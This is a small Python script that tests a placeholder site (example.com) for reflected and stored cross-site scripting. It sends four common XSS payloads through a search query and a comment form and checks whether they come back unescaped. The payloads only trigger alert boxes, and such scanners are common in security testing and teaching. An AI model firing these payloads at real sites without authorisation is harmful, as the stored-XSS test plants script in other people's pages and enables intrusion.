import requests

url_get = "https://example.com/search?q="
url_post = "https://example.com/comment"

payloads = [
        "<script>alert('XSS')</script>",
        "\"'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
]

def test_xss_get(url):
    print("[+] Starting Reflected XSS Test...")
    for payload in payloads:
        target = url + payload
        response = requests.get(target)

        if payload in response.text:
            print(f"[+] XSS was found!! Payload: {payload}")
        else:
                print(f"[-] Safe: {payload}")

def test_xss_post(url):
    print("[+] Starting Stored XSS Test...")
    for payload in payloads:
        data = {"comment": payload}
        response = requests.post(url, data=data)

        if payload in response.text:
            print(f"[+] Stored XSS was found!! Payload: {payload}")
        else:
            print(f"Safe.. {payload}")

if __name__ == "__main__":
    test_xss_get(url_get)
    test_xss_post(url_post)
